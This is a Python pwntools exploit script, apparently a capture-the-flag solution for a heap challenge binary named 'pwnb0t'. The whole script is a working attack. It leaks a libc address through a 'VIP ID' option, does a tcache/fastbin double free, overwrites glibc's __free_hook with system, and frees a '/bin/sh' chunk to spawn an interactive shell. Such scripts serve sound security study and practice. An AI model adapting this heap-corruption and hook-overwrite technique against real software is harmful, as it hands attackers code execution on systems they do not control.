#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./pwnb0t")
libc = ELF("../src/app/glibc/libc.so.6")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


index = 0

# malloc helper function
def malloc(size, data):
    global index
    io.sendline(b"1")
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendlineafter(b"Data: ", data)
    io.recvuntil(b"pwn@b0t:~$ ")
    index += 1
    return index - 1

# free helper function
def free(index):
    io.sendline(b"2")
    io.sendlineafter(b"Index: ", str(index).encode())
    

io = start()

# Leak address to calculate tha libc base
io.sendlineafter(b"pwn@b0t:~$ ", b"256")
io.sendline(b"4 1073742080") 
io.recvuntil(b"VIP ID number: ")
libc.address = int(io.recvline().strip(), 16) - libc.sym.puts
info(f"Libc base: {hex(libc.address)}")

# fill the tcache bins
for i in range(7):
    malloc(31, 8*b"A")

vuln = malloc(31, 8*b"B")

for i in range(7):
    free(i)
# Tcache + Fastbin
free(vuln)

for i in range(7):
    malloc(31, b"BBBB")

free(vuln)

# overwrite free_hook with system
malloc(31, p64(libc.sym.__free_hook - 0x10))
binsh = malloc(31, b"/bin/sh")

malloc(31, p64(libc.sym.system))
# trigger system("/bin/sh")
free(binsh)

io.interactive()
